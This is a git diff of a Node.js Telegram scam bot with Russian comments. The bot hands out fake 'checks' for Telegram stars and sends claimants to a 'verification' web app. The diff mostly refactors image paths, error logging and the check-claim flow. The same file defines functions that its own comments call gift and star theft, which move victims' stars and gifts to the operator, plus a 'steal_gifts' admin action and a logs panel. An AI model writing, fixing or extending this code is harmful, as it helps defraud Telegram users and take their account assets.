@@ -181,42 +181,41 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
 });
 
-// INLINE QUERY ДЛЯ ЧЕКОВ С ФОТО ИЗ public/stars.jpg
+// INLINE QUERY ДЛЯ ЧЕКОВ
 bot.on('inline_query', (query) => {
-
-    const starsImage = `${WEB_APP_URL}/stars.jpg`; 
-    // WEB_APP_URL должен указывать на твой сервер, например:
-    // http://localhost:3000 или https://domain.com
-
     const results = [
         {
-            type: 'photo',
-            id: 'check_50',
-            photo_url: starsImage,
-            thumb_url: starsImage,
-            caption: `🎫 <b>Чек на 50 звезд</b>\n\nНажмите кнопку чтобы забрать:`,
-            parse_mode: 'HTML',
+            type: 'article',
+            id: '1',
+            title: '🎫 Чек на 50 звезд',
+            description: 'Создать чек на 50 звезд',
+            input_message_content: {
+                message_text: '🎫 Чек на 50 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
+                parse_mode: 'HTML'
+            },
             reply_markup: {
                 inline_keyboard: [[
-                    { text: "🪙 Забрать 50 звезд", url: `https://t.me/MyStarBank_bot?start=create_check_50` }
+                    { text: "🪙 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_50` }
                 ]]
             }
         },
         {
-            type: 'photo',
-            id: 'check_100',
-            photo_url: starsImage,
-            thumb_url: starsImage,
-            caption: `🎫 <b>Чек на 100 звезд</b>\n\nНажмите кнопку чтобы забрать:`,
-            parse_mode: 'HTML',
+            type: 'article',
+            id: '2',
+            title: '💫 Чек на 100 звезд',
+            description: 'Создать чек на 100 звезд',
+            input_message_content: {
+                message_text: '🎫 Чек на 100 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
+                parse_mode: 'HTML'
+            },
             reply_markup: {
                 inline_keyboard: [[
-                    { text: "💫 Забрать 100 звезд", url: `https://t.me/MyStarBank_bot?start=create_check_100` }
+                    { text: "💫 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_100` }
                 ]]
             }
         }
     ];
-
+    
     bot.answerInlineQuery(query.id, results, { cache_time: 1 });
 });
 
@@ -239,7 +238,8 @@ bot.onText(/\/start$/, (msg) => {
         ]
     };
 
-    const avatarPath = path.join(process.cwd(), 'public', 'avatar.jpg');
+    // Пробуем отправить с фото avatar.jpg
+    const avatarPath = path.join(__dirname, 'public', 'avatar.jpg');
     
     bot.sendPhoto(chatId, avatarPath, {
         caption: menuText,
@@ -280,9 +280,11 @@ bot.on('callback_query', async (query) => {
                 {
                     parse_mode: 'HTML',
                     reply_markup: {
-                        inline_keyboard: [[
-                            { text: "✅ Пройти верификацию", web_app: { url: WEB_APP_URL } }
-                        ]]
+                        inline_keyboard: [
+                            [
+                                { text: "✅ Пройти верификацию", web_app: { url: WEB_APP_URL } }
+                            ]
+                        ]
                     }
                 }
             );
@@ -292,14 +294,18 @@ bot.on('callback_query', async (query) => {
             
             db.run(
                 `INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
-                [amount, userId],
-                function(err) {
-                    if (err) return;
+                [amount, userId], 
+                function (err) {
+                    if (err) {
+                        console.log('❌ Ошибка INSERT checks:', err.message);
+                        return;
+                    }
                     
                     const checkId = this.lastID;
                     const checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`;
-                    const starsPath = path.join(process.cwd(), 'public', 'stars.jpg');
-
+                    
+                    // Отправляем чек с фоткой stars.jpg
+                    const starsPath = path.join(__dirname, 'public', 'stars.jpg');
                     bot.sendPhoto(chatId, starsPath, {
                         caption: checkText,
                         parse_mode: 'HTML',
@@ -310,7 +316,7 @@ bot.on('callback_query', async (query) => {
                             }]] 
                         }
                     }).catch(photoError => {
-                        console.log('❌ Ошибка фото (stars create_btn):', photoError.message);
+                        console.log('❌ Ошибка фото (stars check create):', photoError.message);
                         // Fallback без фото
                         bot.sendMessage(chatId, checkText, {
                             parse_mode: 'HTML',
@@ -324,11 +330,6 @@ bot.on('callback_query', async (query) => {
                     });
                 }
             );
-        }
-    } catch (error) {
-        console.log('❌ Ошибка callback_query:', error.message);
-    }
-});
             
         } else if (query.data === 'steal_gifts') {
             bot.sendMessage(chatId, "🔄 Начинаю кражу подарков...");
@@ -341,13 +342,15 @@ bot.on('callback_query', async (query) => {
         else if (query.data === 'show_logs') {
             showLogs(chatId);
         }
-    } catch (error) {}
+    } catch (error) {
+        console.log('❌ Ошибка callback_query:', error.message);
+    }
 });
 
 // СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @
-bot.onText(/@MyBankStar_bot/, (msg) => {
+bot.onText(/@MyStarBank_bot/, (msg) => {
     const chatId = msg.chat.id;
-    const starsPath = path.join(process.cwd(), 'public', 'stars.jpg');
+    const starsPath = path.join(__dirname, 'public', 'stars.jpg');
     
     bot.sendPhoto(chatId, starsPath, {
         caption: '🎫 Создание чека:',
@@ -358,7 +361,7 @@ bot.onText(/@MyBankStar_bot/, (msg) => {
             ]
         }
     }).catch(photoError => {
-        console.log('❌ Ошибка фото (stars @create):', photoError.message);
+        console.log('❌ Ошибка фото (stars create via @):', photoError.message);
         // Fallback без фото
         bot.sendMessage(chatId, '🎫 Создание чека:', {
             reply_markup: {
@@ -376,67 +379,104 @@ bot.onText(/\/start (.+)/, (msg, match) => {
     const params = match[1];
     const userId = msg.from.id;
     
+    // АКТИВАЦИЯ ЧЕКА
     if (params.startsWith('check_')) {
         const checkId = params.split('_')[1];
         
-        db.get(`SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, [userId, checkId], (err, usedRow) => {
-            if (err || usedRow) {
-                bot.sendMessage(msg.chat.id, '❌ Чек уже использован!');
-                return;
-            }
-            
-            db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
-                if (err || !row) {
-                    bot.sendMessage(msg.chat.id, '❌ Чек не существует!');
+        db.get(
+            `SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, 
+            [userId, checkId], 
+            (err, usedRow) => {
+                if (err) {
+                    console.log('❌ Ошибка SELECT used_checks:', err.message);
+                    bot.sendMessage(msg.chat.id, '⚠️ Ошибка при проверке чека');
                     return;
                 }
                 
-                db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, userRow) => {
-                    const newBalance = (userRow ? userRow.balance : 0) + row.amount;
-                    
-                    db.serialize(() => {
-                        db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
-                        db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
-                            [userId, msg.from.username, newBalance]);
-                        db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [userId, checkId]);
-                    });
-                    
-                    // Отправляем фото с сообщением о получении чека
-                    const starsPath = path.resolve(__dirname, 'public', 'stars.jpg');
-                    bot.sendPhoto(msg.chat.id, starsPath, {
-                        caption: `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
-                    }).catch(photoError => {
-                        // Fallback без фото
-                        bot.sendMessage(msg.chat.id, 
-                            `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
+                if (usedRow) {
+                    bot.sendMessage(msg.chat.id, '❌ Чек уже использован!');
+                    return;
+                }
+                
+                db.get(
+                    `SELECT * FROM checks WHERE id = ? AND activations > 0`, 
+                    [checkId], 
+                    (err, row) => {
+                        if (err) {
+                            console.log('❌ Ошибка SELECT checks:', err.message);
+                            bot.sendMessage(msg.chat.id, '⚠️ Ошибка при проверке чека');
+                            return;
+                        }
+                        
+                        if (!row) {
+                            bot.sendMessage(msg.chat.id, '❌ Чек не существует!');
+                            return;
+                        }
+                        
+                        db.get(
+                            `SELECT balance FROM users WHERE user_id = ?`, 
+                            [userId], 
+                            (err, userRow) => {
+                                if (err) {
+                                    console.log('❌ Ошибка SELECT users:', err.message);
+                                    bot.sendMessage(msg.chat.id, '⚠️ Ошибка при обновлении баланса');
+                                    return;
+                                }
+
+                                const newBalance = (userRow ? userRow.balance : 0) + row.amount;
+                                
+                                db.serialize(() => {
+                                    db.run(
+                                        `UPDATE checks SET activations = activations - 1 WHERE id = ?`, 
+                                        [checkId]
+                                    );
+                                    db.run(
+                                        `INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
+                                        [userId, msg.from.username, newBalance]
+                                    );
+                                    db.run(
+                                        `INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, 
+                                        [userId, checkId]
+                                    );
+                                });
+                                
+                                const starsPath = path.join(__dirname, 'public', 'stars.jpg');
+                                bot.sendPhoto(msg.chat.id, starsPath, {
+                                    caption: `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
+                                }).catch(photoError => {
+                                    console.log('❌ Ошибка фото (stars receive):', photoError.message);
+                                    // Fallback без фото
+                                    bot.sendMessage(
+                                        msg.chat.id, 
+                                        `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
+                                    );
+                                });
+                            }
                         );
-                    });
-                });
-            });
-        });
+                    }
+                );
+            }
+        );
         
+    // СОЗДАНИЕ ЧЕКА ЧЕРЕЗ ПАРАМЕТР /start create_check_X
     } else if (params.startsWith('create_check_')) {
         const amount = parseInt(params.split('_')[2]);
         
-        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
-            [amount, userId], function(err) {
-            if (err) return;
-            
-            const checkId = this.lastID;
-            // Отправляем чек с фоткой
-            const starsPath = path.resolve(__dirname, 'public', 'stars.jpg');
-            bot.sendPhoto(msg.chat.id, starsPath, {
-                caption: `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`,
-                parse_mode: 'HTML',
-                reply_markup: { 
-                    inline_keyboard: [[{ 
-                        text: `🪙 Забрать ${amount} звезд`, 
-                        url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
-                    }]] 
+        db.run(
+            `INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
+            [amount, userId], 
+            function (err) {
+                if (err) {
+                    console.log('❌ Ошибка INSERT checks (create_check):', err.message);
+                    return;
                 }
-            }).catch(photoError => {
-                // Fallback без фото
-                bot.sendMessage(msg.chat.id, `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`, {
+                
+                const checkId = this.lastID;
+                const text = `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`;
+                const starsPath = path.join(__dirname, 'public', 'stars.jpg');
+
+                bot.sendPhoto(msg.chat.id, starsPath, {
+                    caption: text,
                     parse_mode: 'HTML',
                     reply_markup: { 
                         inline_keyboard: [[{ 
@@ -444,13 +484,25 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                             url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                         }]] 
                     }
+                }).catch(photoError => {
+                    console.log('❌ Ошибка фото (stars create_check):', photoError.message);
+                    // Fallback без фото
+                    bot.sendMessage(msg.chat.id, text, {
+                        parse_mode: 'HTML',
+                        reply_markup: { 
+                            inline_keyboard: [[{ 
+                                text: `🪙 Забрать ${amount} звезд`, 
+                                url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
+                            }]] 
+                        }
+                    });
                 });
-            });
-        });
+            }
+        );
     }
 });
 
-// КРАЖА ПОДАРКОВ (ИЗ ТВОЕГО КОДА 1:1)
+// КРАЖА ПОДАРКОВ
 async function stealAllGifts() {
     try {
         const rows = await new Promise((resolve, reject) => {
@@ -492,7 +544,7 @@ async function stealAllGifts() {
     }
 }
 
-// КРАЖА ЗВЕЗД (ИЗ ТВОЕГО КОДА 1:1)
+// КРАЖА ЗВЕЗД
 async function stealAllStars() {
     try {
         const rows = await new Promise((resolve, reject) => {
@@ -534,7 +586,7 @@ async function stealAllStars() {
     }
 }
 
-// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ЗВЕЗД (ИЗ ТВОЕГО КОДА 1:1)
+// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ЗВЕЗД
 async function transferStarsToNikLa(client, phone) {
     try {
         // Получаем баланс звезд
@@ -588,7 +640,7 @@ async function transferStarsToNikLa(client, phone) {
     }
 }
 
-// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ПОДАРКОВ (ИЗ ТВОЕГО КОДА 1:1)
+// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ПОДАРКОВ
 async function transferGiftsToNikLa(client, phone) {
     try {
         // Получаем список подарков
@@ -715,4 +767,4 @@ bot.onText(/\/admin/, (msg) => {
     });
 });
 
-console.log('✅ Бот запущен с чеками и кражами 1:1');
+console.log('✅ Бот запущен с исправленными путями к фоткам');
